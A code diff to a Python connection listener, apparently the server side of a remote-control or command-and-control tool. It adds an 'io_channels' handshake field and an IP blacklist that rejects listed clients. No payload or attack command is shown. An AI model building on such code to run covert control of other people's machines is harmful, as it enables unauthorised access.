@@ -14,6 +14,7 @@ from domestic.utility.get_timestamp import *
 from domestic.make.make_directories import *
 from domestic.utility.write_error import *
 from domestic.utility.send_email import *
+from domestic.utility.read_file import *
 from domestic.global_state import *
 
 
@@ -43,11 +44,17 @@ def listening(host, port, stdout=True):
       break
     
     try:
-      send_data(client, {'message': 'CsBLDS4n5zPYq7JaxDjxWHK4', 'silent': state['options']['mode']['silent']}, (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe-timeout': state['settings']['safe-timeout']})
+      send_data(client, {'message': 'CsBLDS4n5zPYq7JaxDjxWHK4', 'silent': state['options']['mode']['silent'], 'io_channels': state['settings']['io-channels']}, (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize']), {'safe': state['options']['mode']['safe'], 'safe_timeout': state['settings']['safe-timeout']})
       data = recv_data(client, (state['settings']['encryption'], state['settings']['headersize']))
       data.update({'timer': time.time()})
 
       add_client = True
+
+      if os.path.isfile(f'{state["root"]}/{state["settings"]["folders"]["parent"]}/blacklist.txt'):
+        blacklist = read_file(f'{state["root"]}/{state["settings"]["folders"]["parent"]}/blacklist.txt').decode(state['settings']['encoding']).strip().split('\n')
+        for ip in blacklist:
+          if addr[0] == ip:
+            add_client = False
 
       if not state['options']['validation']['duplicates']:
         for client_data_obj in state['sockets']['clients'][2]:
